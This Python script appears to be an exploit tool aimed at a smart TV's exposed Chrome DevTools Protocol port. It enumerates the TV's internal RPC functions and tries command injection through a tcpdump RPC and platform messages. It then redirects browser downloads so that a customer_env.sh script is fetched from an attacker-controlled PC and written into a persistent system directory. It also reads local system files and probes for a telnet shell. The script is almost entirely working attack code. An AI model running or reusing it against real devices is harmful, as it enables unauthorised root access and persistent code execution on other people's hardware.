#!/usr/bin/env python3
"""Fast CDP probe — discovers and tests all RPC functions in one shot."""
import json, socket, struct, time, urllib.request, re, sys

TV = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"
PC = sys.argv[2] if len(sys.argv) > 2 else "192.168.1.50"

print(f"[*] Waiting for CDP on {TV}:7788 ...")

# Poll until CDP is up
for attempt in range(60):
    try:
        targets = json.loads(urllib.request.urlopen(f'http://{TV}:7788/json', timeout=3).read())
        break
    except:
        if attempt % 5 == 0:
            print(f"  ... attempt {attempt+1}/60")
        time.sleep(2)
else:
    print("FAIL: CDP never opened. Did you open a browser app?")
    sys.exit(1)

ws_url = targets[0]['webSocketDebuggerUrl']
print(f"[+] CDP UP! Target: {targets[0]['title']} -> {targets[0]['url']}")
print(f"    WS: {ws_url}")

m = re.match(r'ws://([^:]+):(\d+)(.*)', ws_url)
host, port, path = m.group(1), int(m.group(2)), m.group(3)

s = socket.create_connection((host, port), timeout=10)
key = 'dGhlIHNhbXBsZSBub25jZQ=='
s.sendall(f'GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n'.encode())
resp = b''
while b'\r\n\r\n' not in resp:
    resp += s.recv(4096)

msg_id = [0]

def ws_send(sock, data):
    payload = data.encode('utf-8')
    frame = bytearray([0x81])
    l = len(payload)
    if l < 126: frame.append(0x80 | l)
    elif l < 65536:
        frame.append(0x80 | 126)
        frame.extend(struct.pack('>H', l))
    else:
        frame.append(0x80 | 127)
        frame.extend(struct.pack('>Q', l))
    mask = b'\x01\x02\x03\x04'
    frame.extend(mask)
    frame.extend(bytes(b ^ mask[i%4] for i, b in enumerate(payload)))
    sock.sendall(bytes(frame))

def ws_recv(sock, timeout=8):
    sock.settimeout(timeout)
    try:
        data = b''
        data = sock.recv(65536)
        if len(data) < 2: return None
        b1, b2 = data[0], data[1]
        plen = b2 & 0x7f
        offset = 2
        if plen == 126:
            plen = struct.unpack('>H', data[2:4])[0]; offset = 4
        elif plen == 127:
            plen = struct.unpack('>Q', data[2:10])[0]; offset = 10
        payload = data[offset:]
        while len(payload) < plen:
            payload += sock.recv(65536)
        return payload[:plen].decode('utf-8', errors='replace')
    except:
        return None

def cdp_eval(expr, timeout=8):
    msg_id[0] += 1
    cmd = json.dumps({'id': msg_id[0], 'method': 'Runtime.evaluate', 'params': {'expression': expr, 'returnByValue': True}})
    ws_send(s, cmd)
    r = ws_recv(s, timeout)
    if r:
        d = json.loads(r)
        res = d.get('result', {}).get('result', {})
        return res.get('value', res.get('description', str(res)))
    return None

def cdp_cmd(method, params=None):
    msg_id[0] += 1
    cmd = {'id': msg_id[0], 'method': method}
    if params: cmd['params'] = params
    ws_send(s, json.dumps(cmd))
    r = ws_recv(s, 8)
    if r:
        return json.loads(r)
    return None

print("[*] Connected! Running probes fast...\n")

# ==================== PROBE 1: RPC Function signatures ====================
print("=" * 60)
print("PROBE 1: All Rpc* function signatures")
print("=" * 60)
r = cdp_eval('''
(function() {
    var results = [];
    for (var k in window) {
        if (k.indexOf('Rpc') === 0 && typeof window[k] === 'function') {
            results.push(k + '(' + window[k].length + ')');
        }
    }
    return results.join('\\n');
})()
''')
print(r)

# ==================== PROBE 2: Safe info gathering ====================
print("\n" + "=" * 60)
print("PROBE 2: RpcSystemCheckFileExist — test key paths")
print("=" * 60)
paths = [
    '/mtd_rwarea/apdat/customer_env.sh',
    '/mtd_rwarea/apdat/',
    '/tmp/busybox',
    '/tmp/cmd',
    '/mnt/browser/nettv/enable_debug_port',
    '/media/sda1/busybox-armhf',
    '/media/sda1/cmd_sender',
    '/media/sda1/nbrowser_log_to_file',
]
for p in paths:
    r = cdp_eval(f'''
    (function() {{
        try {{ var r = RpcSystemCheckFileExist("{p}"); return JSON.stringify(r); }}
        catch(e) {{ return 'ERR:' + e.message; }}
    }})()
    ''')
    print(f"  {p}: {r}")

# ==================== PROBE 3: Debug functions ====================
print("\n" + "=" * 60)
print("PROBE 3: Debug/Factory functions")
print("=" * 60)

for fn in ['RpcSystemDebugMenuGet', 'RpcSystemFactoryNetTVDebugGet',
           'RpcSystemTVInformation', 'RpcSystemGetProcessState',
           'RpcSystemIhsGet', 'RpcSystemDeviceInfoGet',
           'RpcSystemCountryGet', 'RpcSystemLanguageGet']:
    r = cdp_eval(f'''
    (function() {{
        try {{ return JSON.stringify({fn}()); }}
        catch(e) {{ return 'ERR:' + e.message; }}
    }})()
    ''')
    print(f"  {fn}(): {str(r)[:200]}")

# ==================== PROBE 4: Try tcpdump (might exec commands) ====================
print("\n" + "=" * 60)
print("PROBE 4: RpcSystemTcpdumpStart — potential command exec")
print("=" * 60)
r = cdp_eval('''
(function() {
    try {
        var r = RpcSystemTcpdumpStart("echo PWNED > /tmp/cdp_proof");
        return 'result: ' + JSON.stringify(r);
    } catch(e) { return 'ERR:' + e.message; }
})()
''')
print(f"  TcpdumpStart(cmd): {r}")

# ==================== PROBE 5: Try sendPlatformMessage with event listener ====================
print("\n" + "=" * 60)
print("PROBE 5: sendPlatformMessage + event listener")
print("=" * 60)
r = cdp_eval('''
(function() {
    var events = [];
    window.__cdp_events = events;
    window.omi_platform.addPlatformEventListener(function(e) {
        events.push(JSON.stringify(e).substring(0, 500));
    });
    // Try different msg formats
    var formats = [
        JSON.stringify({cmd:"setSystemCmd", data:"echo test1 > /tmp/spm_test"}),
        JSON.stringify({type:"system", action:"exec", command:"echo test2 > /tmp/spm_test"}),
        "setSystemCmd:echo test3 > /tmp/spm_test",
        JSON.stringify({method:"setSystemCmd", params:["echo test4 > /tmp/spm_test"]}),
    ];
    var results = [];
    for (var i = 0; i < formats.length; i++) {
        try {
            var r = window.omi_platform.sendPlatformMessage(formats[i]);
            results.push('F' + i + ':' + String(r));
        } catch(e) {
            results.push('F' + i + '_ERR:' + e.message);
        }
    }
    return 'results=[' + results.join(', ') + '] events_so_far=' + events.length;
})()
''')
print(f"  Result: {r}")

# Wait a moment for async events
time.sleep(2)
r = cdp_eval('JSON.stringify(window.__cdp_events || [])')
print(f"  Events after 2s: {str(r)[:500]}")

# ==================== PROBE 6: Browser.setDownloadBehavior (CHAIN A) ====================
print("\n" + "=" * 60)
print("PROBE 6: Browser.setDownloadBehavior (CHAIN A — PRIMARY)")
print("=" * 60)
r = cdp_cmd('Browser.setDownloadBehavior', {
    'behavior': 'allow',
    'downloadPath': '/mtd_rwarea/apdat/'
})
print(f"  setDownloadBehavior result: {json.dumps(r, indent=2)[:300]}")

if r and 'error' not in r:
    print("  *** DOWNLOAD BEHAVIOR SET! Triggering download... ***")
    # Navigate to download customer_env.sh
    r2 = cdp_eval(f'''
    (function() {{
        try {{
            var a = document.createElement('a');
            a.href = 'http://{PC}:8099/download/customer_env.sh';
            a.download = 'customer_env.sh';
            document.body.appendChild(a);
            a.click();
            return 'download_triggered';
        }} catch(e) {{ return 'ERR:' + e.message; }}
    }})()
    ''')
    print(f"  Download trigger: {r2}")

    # Also try window.open
    time.sleep(1)
    r3 = cdp_eval(f"window.location.href = 'http://{PC}:8099/download/customer_env.sh'")
    print(f"  Navigate to download: {r3}")

# ==================== PROBE 7: Page.setDownloadBehavior ====================
print("\n" + "=" * 60)
print("PROBE 7: Page.setDownloadBehavior")
print("=" * 60)
r = cdp_cmd('Page.setDownloadBehavior', {
    'behavior': 'allow',
    'downloadPath': '/mtd_rwarea/apdat/'
})
print(f"  Result: {json.dumps(r, indent=2)[:300]}")

# ==================== PROBE 8: Try file:// write via XHR ====================
print("\n" + "=" * 60)
print("PROBE 8: file:// read test")
print("=" * 60)
r = cdp_eval('''
(function() {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'file:///etc/hostname', false);
        xhr.send();
        return 'hostname: ' + xhr.responseText;
    } catch(e) { return 'ERR: ' + e.message; }
})()
''')
print(f"  Read /etc/hostname: {r}")

r = cdp_eval('''
(function() {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'file:///proc/version', false);
        xhr.send();
        return xhr.responseText.substring(0, 200);
    } catch(e) { return 'ERR: ' + e.message; }
})()
''')
print(f"  Read /proc/version: {r}")

# ==================== PROBE 9: webkitRequestFileSystem ====================
print("\n" + "=" * 60)
print("PROBE 9: webkitRequestFileSystem (potential write)")
print("=" * 60)
r = cdp_eval('''
(function() {
    try {
        var result = 'pending';
        window.webkitRequestFileSystem(window.PERSISTENT, 1024*1024, function(fs) {
            result = 'FS: ' + fs.name + ' root=' + fs.root.fullPath;
        }, function(e) {
            result = 'ERR: ' + e.message;
        });
        return 'async_started, type=' + typeof window.webkitRequestFileSystem;
    } catch(e) { return 'ERR: ' + e.message; }
})()
''')
print(f"  webkitRequestFileSystem: {r}")

# ==================== FINAL: Check telnet ====================
print("\n" + "=" * 60)
print("FINAL: Connectivity check")
print("=" * 60)
try:
    t = socket.create_connection((TV, 2323), timeout=3)
    t.sendall(b"id\n")
    time.sleep(1)
    resp = t.recv(4096).decode(errors='replace')
    print(f"  *** TELNET:2323 OPEN! {resp[:200]} ***")
    t.close()
except Exception as e:
    print(f"  Telnet:2323 closed ({e})")

s.close()
print("\n=== ALL PROBES DONE ===")
